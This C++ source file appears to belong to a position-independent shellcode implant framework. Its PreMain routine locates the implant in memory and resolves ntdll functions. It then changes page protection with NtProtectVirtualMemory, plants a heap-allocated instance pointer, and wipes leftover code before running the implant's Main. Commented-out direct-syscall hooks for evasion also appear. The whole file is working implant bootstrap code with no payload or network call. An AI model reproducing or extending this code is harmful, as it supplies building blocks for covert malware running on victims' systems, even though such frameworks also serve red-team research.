#include <Common.h>
#include <core/Runtime.h>

ST_GLOBAL PVOID __Instance = C_PTR( 'rdp5' );

EXTERN_C FUNC VOID PreMain(
    PVOID Param
) {
    INSTANCE Stardust = { 0 };
    PVOID    MmAddr   = { 0 };
    SIZE_T   MmSize   = { 0 };
    ULONG    Protect  = { 0 };
    CHAR     Error    = { 0 };

    Imperium::mem::zero( &Stardust, sizeof( Stardust ) );

    //
    // get the base address of the current implant in memory and the end.
    // subtract the implant end address with the start address you will
    // get the size of the implant in memory
    //
    Stardust.Base.Buffer = StRipStart();
    Stardust.Base.Length = U_PTR( StRipEnd() ) - U_PTR( Stardust.Base.Buffer );

    //
    // get the offset and address of our global instance structure
    //
    MmAddr = Stardust.Base.Buffer + InstanceOffset();
    MmSize = sizeof( PVOID );

    //
    // resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
    // updating/patching the Instance in the current memory
    //
    if ( ( Error = ResolveWinApi( &Stardust ) ) != RESOLVE_API_SUCCESS ) {
        //PRINTF_ERROR( "ResolveWinApi failed with error: %d", Error )
        return;
    }

    //
    // change the protection of the .global section page to RW
    // to be able to write the allocated instance heap address
    //
    //SYSCALL_PREPARE_STARDUST( Stardust.Syscall, Stardust.Win32.NtProtectVirtualMemory );
    if ( ! NT_SUCCESS( //SYSCALL_INVOKE(
        Stardust.Win32.NtProtectVirtualMemory(
            NtCurrentProcess(),
            & MmAddr,
            & MmSize,
            PAGE_READWRITE,
            & Protect
        ) ) ) {
        return;
    }

    //
    // assign heap address into the RW memory page
    //
    if ( ! ( C_DEF( MmAddr ) = Stardust.Win32.RtlAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, sizeof( INSTANCE ) ) ) ) {
        return;
    }

    //
    // copy the local instance into the heap,
    // zero out the instance from stack and
    // remove RtRipEnd code/instructions as
    // they are not needed anymore
    //
    Imperium::mem::copy( C_DEF( MmAddr ), &Stardust, sizeof( INSTANCE ) );
    Imperium::mem::zero( &Stardust, sizeof( INSTANCE ) );
    Imperium::mem::zero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    //
    // now execute the implant entrypoint
    //
    Main( Param );
}
